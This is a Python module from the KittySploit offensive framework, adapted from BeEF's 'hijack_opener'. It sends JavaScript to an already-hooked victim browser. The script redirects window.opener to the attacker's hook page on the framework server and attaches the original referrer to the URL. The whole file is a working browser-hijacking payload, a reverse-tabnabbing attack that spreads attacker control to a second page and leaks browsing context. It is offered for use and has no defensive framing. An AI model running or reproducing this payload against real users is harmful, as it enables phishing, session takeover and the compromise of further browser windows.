from kittysploit import *
import json


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Hijack Opener",
		"description": "Redirect window.opener to the KittySploit hook page (BeEF hijack_opener)",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	hook_path = OptString("/test", "Path on the browser server to load (must include the hook)", False)

	def run(self):
		hook_path = str(self.hook_path or "/test").strip()
		if not hook_path.startswith("/"):
			hook_path = "/" + hook_path
		hook_path_js = json.dumps(hook_path)

		code_js = f"""
		(function() {{
			const HOOK_PATH = {hook_path_js};
			const referrer = document.referrer || '';

			if (!window.opener || window.opener === window) {{
				return JSON.stringify({{
					success: false,
					error: 'No window.opener (page was not opened via window.open)'
				}});
			}}

			let host = '127.0.0.1';
			let port = '8080';
			let proto = location.protocol || 'http:';
			if (window.kittysploit) {{
				if (typeof window.kittysploit.getServerHost === 'function') {{
					host = window.kittysploit.getServerHost();
				}}
				if (typeof window.kittysploit.getServerPort === 'function') {{
					port = String(window.kittysploit.getServerPort());
				}}
			}}

			const defaultPort = proto === 'https:' ? '443' : '80';
			const portPart = (port && port !== defaultPort) ? (':' + port) : '';
			const target = proto + '//' + host + portPart + HOOK_PATH +
				(referrer ? ('#opener=' + encodeURIComponent(referrer)) : '');

			try {{
				window.opener.location = target;
				return JSON.stringify({{
					success: true,
					target: target,
					referrer: referrer
				}});
			}} catch (e) {{
				return JSON.stringify({{
					success: false,
					error: e.message || String(e),
					target: target
				}});
			}}
		}})();
		"""

		result = self.send_js_and_wait_for_response(code_js, timeout=10.0)
		if not result:
			print_error("No response from browser")
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError:
			print_error(f"Unexpected response: {result}")
			return False

		if data.get("success"):
			print_success(f"Redirected opener to {data.get('target')}")
			if data.get("referrer"):
				print_info(f"Original opener context: {data.get('referrer')}")
			return True

		print_error(data.get("error", "Could not hijack opener (cross-origin or blocked)"))
		if data.get("target"):
			print_info(f"Attempted URL: {data.get('target')}")
		return False
